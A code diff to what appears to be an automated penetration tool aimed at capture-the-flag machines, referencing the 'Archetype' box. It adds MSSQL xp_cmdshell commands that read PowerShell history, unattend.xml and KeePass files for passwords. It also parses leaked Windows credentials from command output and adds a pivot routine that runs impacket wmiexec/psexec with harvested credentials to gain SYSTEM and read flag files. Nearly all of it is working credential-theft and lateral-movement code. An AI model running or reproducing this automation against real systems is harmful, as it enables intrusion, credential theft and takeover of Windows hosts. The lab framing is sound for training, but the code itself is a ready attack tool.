@@ -33,9 +33,15 @@ _MSSQL_SCRIPT = "\n".join([
     "enable_xp_cmdshell",
     "xp_cmdshell whoami",
     r"xp_cmdshell type %USERPROFILE%\Desktop\user.txt",
-    r"xp_cmdshell dir C:\Users\*\Desktop\*.txt /s /b",
     ('xp_cmdshell powershell -c "gci C:\\Users -Recurse -Force -Include '
      'user.txt,root.txt -EA 0 | %{Write-Output $_.FullName; gc $_.FullName}"'),
+    # PowerShell history is the classic Windows privesc leak (admin password on
+    # Archetype). Read it + a couple of other cred stashes.
+    (r'xp_cmdshell type %USERPROFILE%\AppData\Roaming\Microsoft\Windows'
+     r'\PowerShell\PSReadline\ConsoleHost_history.txt'),
+    ('xp_cmdshell powershell -c "gci C:\\Users -Recurse -Force -Include '
+     'ConsoleHost_history.txt,unattend.xml,*.kdbx -EA 0 | %{Write-Output '
+     '$_.FullName; gc $_.FullName -EA 0}"'),
     "exit",
 ]) + "\n"
 
@@ -74,7 +80,10 @@ def run(host: HostReport, opts) -> None:
                 if _mssql(host, ip, dom, user, pw, client):
                     break
 
-    _spray_and_shells(host, ip, ports, triples)
+    # A credential leaked from the shell (PowerShell history etc.) is usually
+    # the admin — pivot with psexec/wmiexec for SYSTEM and the root flag.
+    _pivot_shell(host, ip, ports, _cred_pairs(host))
+    _spray_and_shells(host, ip, ports, _cred_pairs(host))
     _privesc_notes(host, ip)
 
 
@@ -185,6 +194,20 @@ def _mssql(host, ip, dom, user, pw, client) -> bool:
         # Show the actual command output so the flag is visible even if the
         # auto-parser misses it, and capture any flag tokens.
         _show_output(blob)
+        # Windows cred leaks in the output (PowerShell history: admin password).
+        for wu, wp in knowledge.find_windows_creds(blob):
+            if wp not in host.creds:
+                utils.log("hot", f"credential in PS history/output: {wu} / {wp}",
+                          indent=2)
+                host.add(Finding(
+                    title=f"Windows credential from command output: {wu}",
+                    detail=f"{wu}:{wp} (PowerShell history / script). Likely an "
+                           "admin — pivot with psexec/wmiexec for SYSTEM + root.",
+                    severity="critical", category="cred", port=1433,
+                    service="mssql", evidence=f"{wu}:{wp}"))
+                host.add_cred(wp)
+                host._win_users = getattr(host, "_win_users", set())
+                host._win_users.add(wu)
         if not _harvest_flags(host, blob, f"MSSQL xp_cmdshell ({user})"):
             host.add(Finding(
                 title="MSSQL xp_cmdshell output (no flag token matched)",
@@ -225,6 +248,47 @@ def _show_output(blob: str) -> None:
     utils.log("good", "xp_cmdshell output:", indent=2)
     for line in text.splitlines()[:30]:
         print("      " + utils.c(line[:160], utils.C.GREY))
+
+
+# --- pivot to SYSTEM / root -----------------------------------------------
+def _pivot_shell(host, ip, ports, triples) -> bool:
+    """Use recovered creds (esp. a leaked admin password) to get a shell via
+    wmiexec/psexec and read the root flag — the Archetype PS-history -> admin
+    -> root pivot, automated."""
+    if not ({139, 445} & ports):
+        return False
+    # Prioritise admin-looking accounts and any user seen in leaked creds.
+    win_users = getattr(host, "_win_users", set())
+    ranked = sorted(triples, key=lambda t: (
+        0 if t[1].lower() in ("administrator", "admin") or t[1] in win_users else 1))
+    getflag = ('cmd /c "type C:\\Users\\Administrator\\Desktop\\root.txt & '
+               'type C:\\Users\\Administrator\\Desktop\\user.txt & whoami"')
+    for tool in ("wmiexec", "psexec"):
+        cmd = _impacket_cmd(tool)
+        if not cmd:
+            continue
+        for dom, user, pw in ranked[:6]:
+            target = (f"{dom}/" if dom else "") + f"{user}:{pw}@{ip}"
+            utils.log("info", f"{tool} {dom or '.'}/{user}@{ip} -> root flag ...",
+                      indent=1)
+            rc, out, err = utils.run(cmd + [target, getflag], timeout=90)
+            blob = (out or "") + (err or "")
+            if _tool_broke(blob):
+                break   # tool env issue — stop trying this tool
+            low = blob.lower()
+            if ("login failed" in low or "access denied" in low
+                    or "rpc_s_access_denied" in low or not blob.strip()):
+                continue
+            utils.log("hot", f"shell via {tool} as {user}", indent=1)
+            host.add(Finding(
+                title=f"Shell via {tool} ({user})",
+                detail=f"impacket-{tool} {target.rsplit(':',1)[0]}:'{pw}'@{ip}",
+                severity="critical", category="access", service="smb",
+                evidence=f"{user}:{pw}"))
+            _show_output(blob)
+            if _harvest_flags(host, blob, f"{tool} ({user})"):
+                return True
+    return False
 
 
 # --- SMB / WinRM spray + shells --------------------------------------------
